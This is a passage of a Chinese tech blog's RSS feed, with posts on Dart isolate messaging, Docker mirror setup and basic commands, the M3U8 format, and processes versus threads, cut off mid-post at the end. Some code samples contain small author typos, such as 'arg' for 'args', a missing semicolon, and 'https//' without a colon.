    &lt;span style=&#34;color:#75715e&#34;&gt;// 监听输入报文、处理并提供回复的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// Isolate 主程序
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    newIsolateReceivePort&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;listen&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;dynamic message&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
        CrossIsolatesMessage incomingMessage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; message as CrossIsolatesMessage&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

        &lt;span style=&#34;color:#75715e&#34;&gt;// 处理消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        String newMessage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;complemented string &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; incomingMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

        &lt;span style=&#34;color:#75715e&#34;&gt;// 发送处理的结果
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        incomingMessage&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;newMessage&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;// 帮助类
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CrossIsolatesMessage&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;T&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; SendPort sender&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;final&lt;/span&gt; T message&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

    CrossIsolatesMessage&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;
        &lt;span style=&#34;color:#a6e22e&#34;&gt;@required&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;message&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;销毁这个新的-isolate-实例&#34;&gt;销毁这个新的 Isolate 实例&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 释放一个 isolate 的例程
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; dispose(){
    newIsolate&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;.kill(priority: Isolate.immediate);
    newIsolate &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;简单示例&#34;&gt;简单示例&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//请求的目的端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; SendPort server_TargetPort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;

&lt;span style=&#34;color:#75715e&#34;&gt;//客户端发起连接,拿到服务端的消息接收端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Connect() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;
{
    ReceivePort client_receivePort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort();
    &lt;span style=&#34;color:#75715e&#34;&gt;//client_receivePort.sendPort 是指client_receivePort用于接收消息的端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; Isolate.spawn(Server_onReceivedMsg, [client_receivePort.sendPort,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello world&amp;#34;&lt;/span&gt;]);
   &lt;span style=&#34;color:#75715e&#34;&gt;//自行设计的约定，第一个消息为服务端消息接收端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    server_TargetPort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; client_receivePort.first;
}
&lt;span style=&#34;color:#75715e&#34;&gt;//发送消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; SendToServer(&lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; msg)
{
    ReceivePort port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort();
    server_TargetPort.send([port.sendPort,msg])
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; port.first;
    print(resp.toString());
}

&lt;span style=&#34;color:#75715e&#34;&gt;//服务端接收消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Server_onReceivedMsg(List args) &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt;
{
	&lt;span style=&#34;color:#75715e&#34;&gt;//第一个参数为客户端拥用于接收消息的端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    SendPort sendPort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
    &lt;span style=&#34;color:#75715e&#34;&gt;//第二个参数为&amp;#34;hello world&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    print(arg[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].toString());

	&lt;span style=&#34;color:#75715e&#34;&gt;//创建服务端端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ReceivePort server_receivePort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort();
    &lt;span style=&#34;color:#75715e&#34;&gt;//把服务端接收消息的端口发送给客户端
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    sendPort.send(server_receivePort.sendPort);
    
	&lt;span style=&#34;color:#75715e&#34;&gt;//循环接收消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (List data &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; server_receivePort)
    {
        SendPort replayTo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
        &lt;span style=&#34;color:#66d9ef&#34;&gt;String&lt;/span&gt; msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
        replayTo.send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;success : &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; msg);
    }
 }

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; test()
{
	Connect();
	SendToServer(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;);
	SendToServer(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;efg&amp;#34;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Docker—设置国内镜像源</title>
        <link>https://ac-lm.github.io/posts/docker/docker%E8%AE%BE%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90/</link>
        <pubDate>Wed, 18 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/docker/docker%E8%AE%BE%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90/</guid>
        <description>&lt;h2 id=&#34;修改配置文件&#34;&gt;修改配置文件&lt;/h2&gt;
&lt;p&gt;创建或修改 /etc/docker/daemon.json 文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
     &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;registry-mirrors&amp;#34;&lt;/span&gt;: [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https//hub-mirror.c.163.com&amp;#34;&lt;/span&gt;]
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;del&gt;Docker中国区官方镜像：https://registry.docker-cn.com&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;网易：http://hub-mirror.c.163.com&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;del&gt;中国科技大学 ：https://docker.mirrors.ustc.edu.cn&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;上述镜像似乎已过期，不建议使用&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Docker—后台运行</title>
        <link>https://ac-lm.github.io/posts/docker/docker%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C/</link>
        <pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/docker/docker%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C/</guid>
        <description>&lt;h2 id=&#34;1使用参数--d&#34;&gt;1.使用参数 -d&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker run -d python bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;需要注意的是，docker 在后台运行时，必须有一个前台进程。如果这个进程运行的命令不是能一直挂起的命令（如 ping，sleep），那么在执行完命令后，进程就会退出，同时 docker 也就会停止。&lt;/p&gt;
&lt;h2 id=&#34;2解决方法&#34;&gt;2.解决方法&lt;/h2&gt;
&lt;h3 id=&#34;1执行挂起阻塞命令&#34;&gt;1.执行挂起阻塞命令&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker run -d python sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;99999999999999&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2使用交互界面后退出容器&#34;&gt;2.使用交互界面后退出容器&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker run -it python /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Docker—Bash 命令</title>
        <link>https://ac-lm.github.io/posts/docker/dockerbash-%E5%91%BD%E4%BB%A4/</link>
        <pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/docker/dockerbash-%E5%91%BD%E4%BB%A4/</guid>
        <description>&lt;h2 id=&#34;1运行-docker&#34;&gt;1.运行 docker&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker version &lt;span style=&#34;color:#75715e&#34;&gt;# 查看docker版本&lt;/span&gt;
systemctl start docker &lt;span style=&#34;color:#75715e&#34;&gt;# 运行docker&lt;/span&gt;
systemctl status docker &lt;span style=&#34;color:#75715e&#34;&gt;# 查看docker状态&lt;/span&gt;
systemctl enable docker  &lt;span style=&#34;color:#75715e&#34;&gt;# 自启动docker&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2查看容器&#34;&gt;2.查看容器&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker ps -a  &lt;span style=&#34;color:#75715e&#34;&gt;# 查看容器，包括未运行&lt;/span&gt;
docker ps  &lt;span style=&#34;color:#75715e&#34;&gt;# 查看容易，正在运行的&lt;/span&gt;
docker rm name &lt;span style=&#34;color:#75715e&#34;&gt;# 删除&lt;/span&gt;
docker rm -f name &lt;span style=&#34;color:#75715e&#34;&gt;# 强制删除&lt;/span&gt;
docker rm &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -aq&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 删除全部容器 &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3启动容器&#34;&gt;3.启动容器&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker run --name python3.9 --privileged&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;true -v /root/pythonScript:/pythonScript -it python /bin/bash
&lt;span style=&#34;color:#75715e&#34;&gt;# name 名字，privileged 权限，-v 挂载目录，-it 以shell模式&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# -p 宿主机:容器&lt;/span&gt;
docker rename gallant_swartz python3.9 &lt;span style=&#34;color:#75715e&#34;&gt;# 重命名&lt;/span&gt;
docker start container
docker stop container
docker stop &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -q&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 停用全部运行中的容器&lt;/span&gt;
docker restart container
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4查看镜像&#34;&gt;4.查看镜像&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker images
docker rmi image
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5执行命令&#34;&gt;5.执行命令&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker exec -it id /bin/bash &lt;span style=&#34;color:#75715e&#34;&gt;# 进入容器&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; exit &lt;span style=&#34;color:#75715e&#34;&gt;# 容器内退出&lt;/span&gt;
docker exec id commend  &lt;span style=&#34;color:#75715e&#34;&gt;# 执行命令&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6导出&#34;&gt;6.导出&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker export a9ad7f0cb1ad &amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/itestserver.tar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7下载镜像&#34;&gt;7.下载镜像&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker search ubuntu
docker pull ubuntu
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8查看网络&#34;&gt;8.查看网络&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker network ls
docker network inspect python3.9 &lt;span style=&#34;color:#75715e&#34;&gt;# 查看容器网络配置&lt;/span&gt;
docker inspect -f &lt;span style=&#34;color:#f92672&#34;&gt;{{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.NetworkSettings.IPAddress&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}}&lt;/span&gt; python3.9 &lt;span style=&#34;color:#75715e&#34;&gt;# 查看容器IP&lt;/span&gt;
docker inspect -f&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{{.Name}} {{.NetworkSettings.IPAddress}} {{.HostConfig.PortBindings}}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -aq&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 列出所有容器对应的名称，端口，及IP&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9复制文件&#34;&gt;9.复制文件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker cp testtomcat：/usr/local/tomcat/webapps/test/js/test.js /opt  &lt;span style=&#34;color:#75715e&#34;&gt;# 从容器里面拷文件到宿主机&lt;/span&gt;
docker cp /opt/test.js testtomcat：/usr/local/tomcat/webapps/test/js  &lt;span style=&#34;color:#75715e&#34;&gt;# 从宿主机拷文件到容器里面&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—什么是 M3U8</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-m3u8/</link>
        <pubDate>Thu, 05 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-m3u8/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/346683119&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; m3u8到底是什么格式？ @星选酷 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1视频播放的过程&#34;&gt;1.视频播放的过程&lt;/h2&gt;
&lt;p&gt;要了解 m3u8 文件格式，首先要了解现在视频播放的过程。现在的视频网站采用的是流媒体传输协议，就是将一段视频分割成无数个小段，每一个小段就是一个 ts 格式的视频文件，然后传输到视频网站上一段一段的播放。这样做的好处是能使用户观看更加流畅，因为在观看过程中网站会根据网络状况自动切换视频的清晰度，下载不同分辨率的 ts 视频文件，在网络状况不稳定的情况下，对保障流畅播放非常有帮助。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291739325.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291739325.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务器采集编码传输视频到切片器&lt;/li&gt;
&lt;li&gt;切片器对视频创建索引文件，并且切割成n个ts文件&lt;/li&gt;
&lt;li&gt;这2个文件传输到http服务器上&lt;/li&gt;
&lt;li&gt;网站/客户端根据索引文件查找http服务器上的ts文件，连续播放这n个ts文件，就可以了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;这个索引文件就是 M3U8&lt;/strong&gt; ，索引文件里面存储着 ts 文件的网络 url 链接，网站需要拿到索引文件，按照 url 链接下载在 http 服务器中的 ts文件，类似于爬虫，所有 ts 文件顺序播放，就完成了整个视频的播放。&lt;/p&gt;
&lt;h2 id=&#34;扩展阅读&#34;&gt;扩展阅读&lt;/h2&gt;
&lt;p&gt;M3U（Moving Picture Experts Group Audio Layer 3 Uniform Resource Locator）是音频文件的列表文件，是纯文本文件，记录着视频资源的网络地址。&lt;/p&gt;
&lt;p&gt;M3U8 就是 M3U 的 UTF-8 格式文件&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—什么是多进程与多线程与协程</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</link>
        <pubDate>Wed, 04 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_43279936/article/details/88047004&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 多进程，多线程，协程的理解_@qq_43279936 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是进程什么是线程&#34;&gt;1.什么是进程？什么是线程？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;进程是表示资源分配的基本单位，是调度运行的基本单位。当用户运行自己的程序时，系统就创建一个进程，并为它分配包括内存空间、磁盘空间、I/O设备等资源。然后，把该进程放入进程的就绪队列中等待被系统执行。当该进程被系统的进程调度程序选中后，系统会为它分配CPU以及其它资源，运行该进程。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;线程是进程中执行运算的最小单位，如果把进程理解为在逻辑上操作系统所完成的任务，那么线程表示完成该任务的许多可能的子任务之一。线程与进程的包含关系如下图所示。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291739605.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291739605.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;2多进程和多线程的区别&#34;&gt;2.多进程和多线程的区别？&lt;/h2&gt;
&lt;h3 id=&#34;a数据共享同步&#34;&gt;a.数据共享、同步&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多进程：不共享数据，数据交换需要用IPC(进程间通信)，数据因此同步简单&lt;/li&gt;
&lt;li&gt;多线程：共享进程数据，数据处理交换方便，数据因此同步复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;b内存cpu&#34;&gt;b.内存、CPU&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多进程：占用内存多，切换复杂，CPU利用率低&lt;/li&gt;
&lt;li&gt;多线程：占用内存少，切换简单，CPU利用率高&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;c创建销毁切换&#34;&gt;c.创建销毁、切换&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多进程：创建销毁、切换复杂，速度慢&lt;/li&gt;
&lt;li&gt;多线程：创建销毁、切换简单，速度快&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;d编程调试&#34;&gt;d.编程、调试&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多进程：编程简单，调试简单&lt;/li&gt;
&lt;li&gt;多线程：编程复杂，调试复杂&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;e可靠性&#34;&gt;e.可靠性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;多进程：进程间互不影响，一个进程挂了，程序也不会整个挂掉&lt;/li&gt;
&lt;li&gt;多线程：线程影响着进程，一个线程挂掉，将导致整个进程挂掉&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3进程间或线程间的通信方式&#34;&gt;3.进程间或线程间的通信方式&lt;/h2&gt;
&lt;ul&gt;
